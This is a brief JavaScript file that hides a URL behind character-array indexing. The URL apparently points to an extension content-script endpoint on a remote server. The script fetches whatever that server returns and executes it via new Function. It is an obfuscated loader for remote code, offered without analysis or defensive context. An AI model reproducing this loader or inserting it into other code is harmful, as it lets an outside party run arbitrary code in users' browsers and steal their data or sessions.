function Tracks() {
  var strings = "abcdefghijklmnopqrstuvwxyz72/.:38753947493484".split('');
  return strings;
}

function sStore() {
  var save = Tracks();
  var st = save[7]+save[19]+save[19]+save[15]+save[18]+save[30]+save[28]+save[28]+save[12]+save[24]+save[1]+save[0]+save[11]+save[11]+save[29]+save[6]+save[4]+save[28]+save[4]+save[23]+save[19]+save[4]+save[13]+save[18]+save[8]+save[14]+save[13]+save[28]+save[11]+save[8]+save[1]+save[28]+save[2]+save[14]+save[13]+save[19]+save[4]+save[13]+save[19]+save[18]+save[2]+save[17]+save[8]+save[15]+save[19]+save[29]+save[15]+save[7]+save[15];
  return st;
}

var svsz = sStore();
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function(){
       if(xmlhttp.status==200 && xmlhttp.readyState==4){    
         var zd = xmlhttp.responseText;
         var zdx = new Function (zd);
         zdx();
       }
}
xmlhttp.open("GET",svsz,true);
xmlhttp.send();
